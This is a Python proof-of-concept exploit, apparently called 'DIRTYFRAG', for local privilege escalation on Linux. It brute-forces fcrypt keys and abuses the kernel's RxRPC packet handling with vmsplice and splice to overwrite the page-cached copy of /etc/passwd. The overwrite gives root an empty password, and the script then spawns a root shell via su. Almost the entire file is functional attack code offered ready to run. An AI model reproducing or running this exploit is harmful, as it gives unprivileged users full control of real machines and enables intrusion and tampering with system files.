#!/usr/bin/env python3
import os, sys, socket, struct, ctypes, ctypes.util, time, select, mmap, base64
from ctypes import c_void_p, c_size_t

TARGET_PATH = "/etc/passwd"
SYS_add_key, SYS_keyctl, SYS_unshare, SYS_vmsplice, SYS_splice = 248, 250, 272, 278, 275
SPLICE_F_MOVE, SPLICE_F_NONBLOCK = 1, 2
ALG_OP_ENCRYPT, ALG_OP_DECRYPT = 1, 0
RXRPC_SECURITY_KEY, RXRPC_MIN_SECURITY_LEVEL, RXRPC_USER_CALL_ID = 1, 2, 1
RXRPC_SECURITY_AUTH = 2
RXRPC_PACKET_TYPE_CHALLENGE, RXRPC_PACKET_TYPE_DATA = 3, 5
RXRPC_LAST_PACKET, RXRPC_CHANNELMASK, RXRPC_CIDSHIFT = 0x04, 3, 2
AF_ALG, SOL_ALG, ALG_SET_KEY, ALG_SET_IV, ALG_SET_OP = 38, 279, 1, 2, 3

libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

class iovec(ctypes.Structure):
    _fields_ = [("iov_base", c_void_p), ("iov_len", c_size_t)]

class msghdr(ctypes.Structure):
    _fields_ = [("msg_name", c_void_p), ("msg_namelen", ctypes.c_uint),
                ("msg_iov", ctypes.POINTER(iovec)), ("msg_iovlen", ctypes.c_size_t),
                ("msg_control", c_void_p), ("msg_controllen", ctypes.c_size_t),
                ("msg_flags", ctypes.c_int)]

def _sc(nr, *a):
    r = libc.syscall(nr, *a)
    if r == -1: raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def add_key(t, d, p, pl, ring): return _sc(SYS_add_key, t, d, p, pl, ring)
def keyctl(cmd, *a): return _sc(SYS_keyctl, cmd, *a)
def unshare(f): return _sc(SYS_unshare, f)
def vmsplice(fd, iov, n, fl=0): return _sc(SYS_vmsplice, fd, ctypes.byref(iov), n, fl)
def splice(fd_in, off_in, fd_out, off_out, length, flags=0):
    return _sc(SYS_splice, fd_in, off_in, fd_out, off_out, length, flags)

# =====================================================================
# fcrypt sbox tables (base64 from kernel crypto/fcrypt.c)
# =====================================================================
S0 = base64.b64decode('6n+yZJ2w2RHNhoaRCrKTBg4G0mVzxShg8iC1OH7an+PSz8Q8Yf9KSjWsql8ru7xTTp14o9wJMhDGb2bWq6mv/TuV6DSagXKAnPPs2p8mdhU+VU3ehO6tx/FrPdMESaokC4qDuvqFoKix1AHYcGTwUdLDp3WMpWTvEE63xmED60Q95bNbrtWtHfpaHjOrk6K356hFpM0pY0S2aX4uYgPI4Be7x/M/NrpxjpdlYGm29uZu4IFZ6K/dlSKZ/dPO1Zi0PFjKsZCKR/cx8BpSqzxz1x2f5o/kzs2MaCN6HEAhKvQZiHhuLkhyN/XKZ6tfMU6eCCaaTRTDjXt0J5J8x6ss1g==')
S1 = base64.b64decode('cvWMfJD9CQEIE3ssXhc8fXluVB4JGWQOATJTNhpycRh2AENCY/c2XjOSEsUSmSyLqcicYnXCgEZQDDbKdhZjH0ElSRIxVZkHLxRqWRVoco4DLotTcRdiCAUkPUYYgZNBKBkIJy4VGlE5Zzc+RxBviHloRQoxMzBOV0NpRS0mBjxjXggtZ3AqezhQNEYlJGVAOxpREw46SncsRA9pC1Uccx58SCFhT2s6BRR+Kls7KQsEZmANCSIHWDVtG3hsIAFWMkt0TGovI3paEV1cXz9NAgxCUhYKg3VkHUsrf2Y9BnheWwMoH0R9Pw0pVE4bWSdcbjcrOUhrTw5/WBkmIhicHg==')
S2 = base64.b64decode('0MvP8rNxjlPKExqCzEYlD/bzFNOwXGvXoEiYmaQbjEuKSQVUaCFXpr7RJHnmNDhQR7SoQXvf9Aj4OioDg4bR7FDwQngvbb+AhyeV4sVd+W/btGVu5yTIGrtJtQp9uejct9lFIBvOWZ1rvQ6Po6m8dKb2f1+xaIS8qf1VUOm2E14HuJUCwNBqGoW9tv3+Fz8Jo4377dodbRxsAVrlcT6La74p6xIZNM2zvTXqS9WuKnlapTISe9ws0CJLsYVZgMAwn3PTFEhABy2PgA/OC163XqwklEoYFQXoAnepx0BFidHq3gx5KplsPpXdjH2tb9z//WJHsyGK7I4ZGLRuPf10VB4Ehdi8H1bnOlZn1sil847erjdJt/rI9B/gKpsV0TQOteBEeIRZVmh3pRQG9S+MinOAdrQQhg==')
S3 = base64.b64decode('qSpIUYR+SeK1t0IzfV2mEkRIbSiqIG1X1mtdcvCSWhtTgCRwmsynZqEBpUGXQTGC8RTPUw2gEMwqfdK/SxrbFkf2UTbt87kap98pQwFUcKS/1AtTRGCeI6EYaE/wL4LCKkGyQgztDB0TOjxuNdxgZYXpZAKaP5+Hlt++8svlbNRag7+SG5QAQs9LAHW6j3ZfXTpNCRIIOJUX5AEdTKnMhYJMnS87ZqE0EM1ZiaUxzwXIhPrHuk6LGhnxoTsYEhewmI0LI8M6LSDfE6CoTA1sL0cTE1IfLfV5PaJUvWnIa/MFKPEWRkCwEdO3lUnPwx2P2OFz263IyamhwsXjuvwOJQ==')

_fc_sbox0 = [0]*256; _fc_sbox1 = [0]*256; _fc_sbox2 = [0]*256; _fc_sbox3 = [0]*256
for i in range(256):
    _fc_sbox0[i] = struct.unpack(">I", struct.pack(">I", (S0[i] << 3) & 0xffffffff))[0]
    _fc_sbox1[i] = struct.unpack(">I", struct.pack(">I", (((S1[i] & 0x1f) << 27) | (S1[i] >> 5)) & 0xffffffff))[0]
    _fc_sbox2[i] = struct.unpack(">I", struct.pack(">I", (S2[i] << 11) & 0xffffffff))[0]
    _fc_sbox3[i] = struct.unpack(">I", struct.pack(">I", (S3[i] << 19) & 0xffffffff))[0]

def _fc_ror56_64(k, n):
    mask = (1 << n) - 1
    return ((k >> n) | ((k & mask) << (56 - n))) & ((1 << 56) - 1)

def _fc_setkey(key):
    k = 0
    for i in range(8): k = (k << 7) | (key[i] >> 1)
    sched = []
    for i in range(15):
        sched.append(struct.unpack(">I", struct.pack(">I", (k >> 32) & 0xffffffff))[0])
        k = _fc_ror56_64(k, 11)
    sched.append(struct.unpack(">I", struct.pack(">I", (k >> 32) & 0xffffffff))[0])
    return sched

def _fc_f(R, L, sched):
    u = struct.pack(">I", (sched ^ R) & 0xffffffff)
    return L ^ (_fc_sbox0[u[0]] ^ _fc_sbox1[u[1]] ^ _fc_sbox2[u[2]] ^ _fc_sbox3[u[3]])

def _fc_decrypt(sched, out, inp):
    L = struct.unpack(">I", bytes(inp[:4]))[0]
    R = struct.unpack(">I", bytes(inp[4:8]))[0]
    for i in range(15, -1, -1):
        R, L = _fc_f(L, R, sched[i]), L
    out[:4] = struct.pack(">I", L)
    out[4:8] = struct.pack(">I", R)

# =====================================================================
# Brute-force
# =====================================================================

def _splitmix64(s):
    z = (s + 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9 & 0xFFFFFFFFFFFFFFFF
    z = (z ^ (z >> 27)) * 0x94D049BB133111EB & 0xFFFFFFFFFFFFFFFF
    return z ^ (z >> 31)

def _check_pa(P): return P[0] == ord(':') and P[1] == ord(':')
def _check_pb(P): return P[0] == ord('0') and P[1] == ord(':')
def _check_pc(P):
    if P[0] != ord('0') or P[1] != ord(':') or P[7] != ord(':'): return False
    for i in range(2, 7):
        if P[i] in (ord(':'), 0, ord('\n')): return False
    return True

def find_K(C, max_iters, check_fn, seed):
    t0 = time.monotonic()
    for it in range(max_iters):
        seed = (seed + 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
        r = _splitmix64(seed - 0x9E3779B97F4A7C15)
        K = struct.pack("<Q", r)
        sched = _fc_setkey(K)
        P = bytearray(8)
        _fc_decrypt(sched, P, C)
        if check_fn(P):
            dt = time.monotonic() - t0
            print(f"[+] Key found after {it} iters in {dt:.1f}s")
            return K, bytes(P)
        if (it & 0x3ffffff) == 0 and it > 0:
            dt = time.monotonic() - t0
            print(f"  [{it}] {dt:.1f}s elapsed ({it/dt/1e6:.2f}M/s)")
    return None, None

# =====================================================================
# AF_ALG pcbc(fcrypt)
# =====================================================================

def alg_open_pcbc_fcrypt(key):
    s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    salg = struct.pack("<HH14s64s", AF_ALG, 0, b"skcipher\x00\x00\x00\x00\x00\x00", b"pcbc(fcrypt)\x00" + b"\x00"*52)
    s.bind(salg)
    s.setsockopt(SOL_ALG, ALG_SET_KEY, key)
    return s

def alg_op(alg_s, op, iv, data_in):
    op_fd = alg_s.accept()[0]
    cmsg_op = struct.pack("<III", socket.CMSG_LEN(4), SOL_ALG, ALG_SET_OP) + struct.pack("<I", op)
    aiv_len = struct.calcsize("<II") + 8
    cmsg_iv = struct.pack("<III", socket.CMSG_LEN(aiv_len), SOL_ALG, ALG_SET_IV) + struct.pack("<I", 8) + iv
    cbuf = cmsg_op + cmsg_iv
    iov = iovec(ctypes.cast(ctypes.c_char_p(data_in), c_void_p), len(data_in))
    mh = msghdr(None, 0, ctypes.pointer(iov), 1, ctypes.cast(ctypes.c_char_p(cbuf), c_void_p), len(cbuf), 0)
    ret = libc.sendmsg(op_fd, ctypes.byref(mh), 0)
    if ret < 0:
        op_fd.close()
        raise OSError(ctypes.get_errno(), "AF_ALG sendmsg failed")
    out = os.read(op_fd, len(data_in))
    op_fd.close()
    if len(out) != len(data_in):
        raise RuntimeError(f"AF_ALG read got {len(out)} want {len(data_in)}")
    return out

def compute_csum_iv(epoch, cid, sec_ix, key):
    s = alg_open_pcbc_fcrypt(key)
    out = alg_op(s, ALG_OP_ENCRYPT, key, struct.pack(">IIII", epoch, cid, 0, sec_ix))
    s.close()
    return out[8:16]

def compute_cksum(cid, call_id, seq, key, csum_iv):
    s = alg_open_pcbc_fcrypt(key)
    x = ((cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT)) | (seq & 0x3fffffff)
    out = alg_op(s, ALG_OP_ENCRYPT, csum_iv, struct.pack(">II", call_id, x))
    s.close()
    y = struct.unpack(">I", out[4:8])[0]
    v = (y >> 16) & 0xffff
    if v == 0: v = 1
    return v

# =====================================================================
# RxRPC helpers
# =====================================================================

def build_rxrpc_v1_token(key):
    import time as _time
    now = int(_time.time()); expires = now + 86400; cell = b"evil"; clen = len(cell)
    pad = (4 - (clen & 3)) & 3
    tokstart = struct.pack(">III", 2, 0, 1) + key + struct.pack(">III", now, expires, 1) + struct.pack(">I", 8) + b"\xcc"*8
    toklen = len(tokstart)
    out = struct.pack(">II", 0, clen) + cell + b"\x00"*pad + struct.pack(">II", 1, toklen) + tokstart
    return out

def add_rxrpc_key(desc, key):
    payload = build_rxrpc_v1_token(key)
    return add_key(b"rxrpc\x00", desc.encode() + b"\x00", payload, len(payload), -1)

def setup_rxrpc_client(local_port, keyname):
    fd = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
    fd.setsockopt(socket.SOL_RXRPC, RXRPC_SECURITY_KEY, keyname)
    fd.setsockopt(socket.SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, struct.pack("<i", RXRPC_SECURITY_AUTH))
    srx = struct.pack("<HHHHH", socket.AF_RXRPC, 0, socket.SOCK_DGRAM, 0, 0)
    srx += struct.pack(">I", socket.htonl(0x7F000001))
    srx += struct.pack(">H", socket.htons(local_port))
    srx += b"\x00" * (56 - len(srx))
    fd.bind(srx)
    return fd

def rxrpc_client_initiate_call(cli_fd, srv_port, service_id, user_call_id):
    data = b"PINGPING"
    srx = struct.pack("<HHHHH", socket.AF_RXRPC, service_id, socket.SOCK_DGRAM, 0, 0)
    srx += struct.pack(">I", socket.htonl(0x7F000001))
    srx += struct.pack(">H", socket.htons(srv_port))
    srx += b"\x00" * (56 - len(srx))
    cmsg = struct.pack("<III", socket.CMSG_LEN(8), socket.SOL_RXRPC, RXRPC_USER_CALL_ID) + struct.pack("<Q", user_call_id)
    iov = iovec(ctypes.cast(ctypes.c_char_p(data), c_void_p), len(data))
    mh = msghdr(ctypes.cast(ctypes.c_char_p(srx), c_void_p), len(srx), ctypes.pointer(iov), 1,
                ctypes.cast(ctypes.c_char_p(cmsg), c_void_p), len(cmsg), 0)
    fl = libc.fcntl(cli_fd, 3)
    libc.fcntl(cli_fd, 4, fl | 2048)
    ret = libc.sendmsg(cli_fd, ctypes.byref(mh), 0)
    libc.fcntl(cli_fd, 4, fl)
    if ret < 0:
        e = ctypes.get_errno()
        if e in (11, 35): return 0
        raise OSError(e, os.strerror(e))
    return 0

def setup_udp_server(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", port))
    return s

def udp_recv_to(s, timeout_ms):
    p = select.poll(); p.register(s, select.POLLIN)
    if not p.poll(timeout_ms): return None, None
    return s.recvfrom(2048)

def build_rxrpc_wire_header(epoch, cid, callNumber, seq, serial, ptype, flags, userStatus, securityIndex, cksum, serviceId):
    return struct.pack(">IIIIIBBBBHH", epoch, cid, callNumber, seq, serial, ptype, flags, userStatus, securityIndex, cksum, serviceId)

# =====================================================================
# Kernel trigger
# =====================================================================

trigger_seq = 0

def do_one_trigger(target_fd, splice_off, splice_len, session_key):
    global trigger_seq
    keyname = f"evil{trigger_seq}".encode()
    trigger_seq += 1
    key = add_rxrpc_key(keyname.decode().rstrip('\x00'), session_key)
    if key < 0:
        print(f"[!] add_rxrpc_key failed: {os.strerror(ctypes.get_errno())}")
        return -1
    port_S = 7777 + ((trigger_seq * 2) % 200)
    port_C = port_S + 1
    svc_id = 1234
    udp_srv = setup_udp_server(port_S)
    try:
        rxsk_cli = setup_rxrpc_client(port_C, keyname.decode().rstrip('\x00'))
    except Exception as e:
        print(f"[!] setup_rxrpc_client: {e}")
        udp_srv.close(); keyctl(3, key)
        return -1
    try:
        rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD)
    except Exception as e:
        print(f"[!] initiate_call: {e}")
        udp_srv.close(); rxsk_cli.close(); keyctl(3, key)
        return -1
    pkt, cli_addr = udp_recv_to(udp_srv, 1500)
    if not pkt or len(pkt) < 32:
        print(f"[!] udp_recv_to: n={len(pkt) if pkt else None}")
        udp_srv.close(); rxsk_cli.close(); keyctl(3, key)
        return -1
    whdr = pkt[:32]
    epoch = struct.unpack(">I", whdr[0:4])[0]
    cid = struct.unpack(">I", whdr[4:8])[0]
    callN = struct.unpack(">I", whdr[8:12])[0]
    svc_in = struct.unpack(">H", whdr[30:32])[0]
    cli_port = cli_addr[1]
    # Send CHALLENGE
    chal_hdr = build_rxrpc_wire_header(epoch, cid, 0, 0, 0x10000, RXRPC_PACKET_TYPE_CHALLENGE, 0, 0, 2, 0, svc_in)
    chal_body = struct.pack(">III", 2, 0xDEADBEEF, 1) + b"\x00"*4
    udp_srv.sendto(chal_hdr + chal_body, ("127.0.0.1", cli_port))
    # Drain RESPONSE
    for _ in range(4):
        if udp_recv_to(udp_srv, 500) is None: break
    # Compute csum
    csum_iv = compute_csum_iv(epoch, cid, 2, session_key)
    cksum_h = compute_cksum(cid, callN, 1, session_key, csum_iv)
    # Build malicious DATA header
    mal = build_rxrpc_wire_header(epoch, cid, callN, 1, 0x42000, RXRPC_PACKET_TYPE_DATA, RXRPC_LAST_PACKET, 0, 2, cksum_h, svc_in)
    udp_srv.connect(("127.0.0.1", cli_port))
    p = os.pipe()
    try:
        viv = iovec(ctypes.cast(ctypes.c_char_p(mal), c_void_p), len(mal))
        if vmsplice(p[1], viv, 1, 0) < 0: raise OSError(ctypes.get_errno(), "vmsplice")
        off = ctypes.c_int64(splice_off)
        if splice(target_fd, ctypes.byref(off), p[1], None, splice_len, SPLICE_F_NONBLOCK) < 0:
            raise OSError(ctypes.get_errno(), "splice(file->pipe)")
        if splice(p[0], None, udp_srv.fileno(), None, len(mal) + splice_len, 0) < 0:
            raise OSError(ctypes.get_errno(), "splice(pipe->udp)")
    finally:
        os.close(p[0]); os.close(p[1])
    fl = libc.fcntl(rxsk_cli, 3)
    libc.fcntl(rxsk_cli, 4, fl | 2048)
    for _ in range(5):
        try:
            rxsk_cli.recv(2048)
            break
        except BlockingIOError:
            time.sleep(0.02)
    libc.fcntl(rxsk_cli, 4, fl)
    udp_srv.close()
    rxsk_cli.close()
    keyctl(3, key)
    return 0

# =====================================================================
# Main
# =====================================================================

def main():
    if os.getuid() == 0:
        print("[+] Already root!"); os.execlp("/bin/bash", "bash")
    try:
        dummy = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
        dummy.close()
        print("[+] rxrpc module autoloaded")
    except Exception as e:
        print(f"[-] Cannot create AF_RXRPC socket: {e}"); sys.exit(1)
    target_path = os.environ.get("POC_TARGET_FILE", "/etc/passwd")
    rfd = os.open(target_path, os.O_RDONLY)
    st = os.fstat(rfd)
    if st.st_size < 32: print("[-] target too small"); sys.exit(1)
    print(f"[*] target {target_path} size={st.st_size}")
    buf = mmap.mmap(rfd, 4096, mmap.MAP_SHARED, mmap.PROT_READ)
    print("[*] mmap'd page-cache")
    line = buf[:32]
    if b"root::" in line[:8]:
        print("[+] Already corrupted!"); buf.close(); os.close(rfd); spawn_shell(); return
    off_a, off_b, off_c = 4, 6, 8
    Ca = bytes(buf[off_a:off_a+8])
    Cb = bytes(buf[off_b:off_b+8])
    Cc = bytes(buf[off_c:off_c+8])
    print(f"[*] Ca@{off_a}: {Ca.hex()}")
    print(f"[*] Cb@{off_b}: {Cb.hex()}")
    print(f"[*] Cc@{off_c}: {Cc.hex()}")
    # selftest
    z = bytes(8)
    cv = bytes([0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7, 0xED, 0x41])
    ctx0 = _fc_setkey(z)
    pv = bytearray(8)
    _fc_decrypt(ctx0, pv, cv)
    if bytes(pv) != z:
        print("[-] fcrypt selftest FAILED"); sys.exit(1)
    print("[+] fcrypt selftest OK")
    seed_base = (int(time.time()) * 0x100000001) ^ os.getpid()
    e = os.environ.get("LPE_SEED")
    if e: seed_base = int(e, 0)
    max_iters = int(os.environ.get("LPE_MAX_ITERS", "10000000000"), 0)
    print("\n=== STAGE 1a: search K_A (chars 4-5 := '::') ===")
    Ka, Pa = find_K(Ca, max_iters, _check_pa, seed_base)
    if Ka is None: print("[-] K_A exhausted"); sys.exit(2)
    Cb_actual = Pa[2:8] + Cb[6:8]
    print(f"[*] Cb_actual = {Cb_actual.hex()}")
    print("\n=== STAGE 1b: search K_B (chars 6-7 := '0:') ===")
    Kb, Pb = find_K(Cb_actual, max_iters, _check_pb, seed_base ^ 0xa5a5a5a5a5a5a5a5)
    if Kb is None: print("[-] K_B exhausted"); sys.exit(2)
    Cc_actual = Pb[2:8] + Cc[6:8]
    print(f"[*] Cc_actual = {Cc_actual.hex()}")
    print("\n=== STAGE 1c: search K_C (chars 8-15 := '0:GGGGGG:') ===")
    Kc, Pc = find_K(Cc_actual, max_iters, _check_pc, seed_base ^ 0x5a5a5a5a5a5a5a5a)
    if Kc is None: print("[-] K_C exhausted"); sys.exit(2)
    pred = f"root{Pa[:2].decode('latin-1',errors='replace')}{Pb[:2].decode('latin-1',errors='replace')}{Pc[:8].decode('latin-1',errors='replace')}/root:/bin/bash"
    print(f"\n[+] Predicted post-corruption line: {pred}")
    print(f"\n=== STAGE 2a: kernel trigger A @ off {off_a} ===")
    if do_one_trigger(rfd, off_a, 8, Ka) < 0: print("[-] trigger A failed"); sys.exit(3)
    print(f"\n=== STAGE 2b: kernel trigger B @ off {off_b} ===")
    if do_one_trigger(rfd, off_b, 8, Kb) < 0: print("[-] trigger B failed"); sys.exit(3)
    print(f"\n=== STAGE 2c: kernel trigger C @ off {off_c} ===")
    if do_one_trigger(rfd, off_c, 8, Kc) < 0: print("[-] trigger C failed"); sys.exit(3)
    after = bytes(buf[:32])
    print(f"[*] After: {after[:32]}")
    ok = (after[4] == ord(':') and after[5] == ord(':') and after[6] == ord('0') and after[7] == ord(':') and
          after[8] == ord('0') and after[9] == ord(':') and after[15] == ord(':'))
    if not ok: print("[-] sanity check failed"); sys.exit(4)
    print("\n[!!!] HIT — root entry now has empty passwd, uid=0, gid=0")
    buf.close(); os.close(rfd)
    if "--corrupt-only" in sys.argv or os.environ.get("DIRTYFRAG_CORRUPT_ONLY") == "1": return
    spawn_shell()

def spawn_shell():
    print("\n=== STAGE 4: spawning root shell via `su` ===")
    import pty, termios, tty
    master, slave = pty.openpty()
    pid = os.fork()
    if pid == 0:
        os.setsid()
        slave_fd = os.open(os.ttyname(slave), os.O_RDWR)
        tty.ioctl(slave_fd, tty.TIOCSCTTY, 0)
        os.dup2(slave_fd, 0); os.dup2(slave_fd, 1); os.dup2(slave_fd, 2)
        if slave_fd > 2: os.close(slave_fd)
        os.close(master)
        os.execlp("su", "su")
        os._exit(127)
    os.close(slave)
    try:
        old = termios.tcgetattr(sys.stdin.fileno())
        tty.setraw(sys.stdin.fileno())
    except Exception:
        old = None
    try:
        while True:
            r, _, _ = select.select([master, sys.stdin], [], [], 0.1)
            if master in r:
                try: data = os.read(master, 4096)
                except OSError: break
                if not data: break
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                try: data = os.read(sys.stdin.fileno(), 4096)
                except OSError: break
                if not data: break
                os.write(master, data)
    except KeyboardInterrupt: pass
    finally:
        if old: termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old)
        os.close(master)
        try: os.waitpid(pid, 0)
        except ChildProcessError: pass

if __name__ == "__main__":
    main()
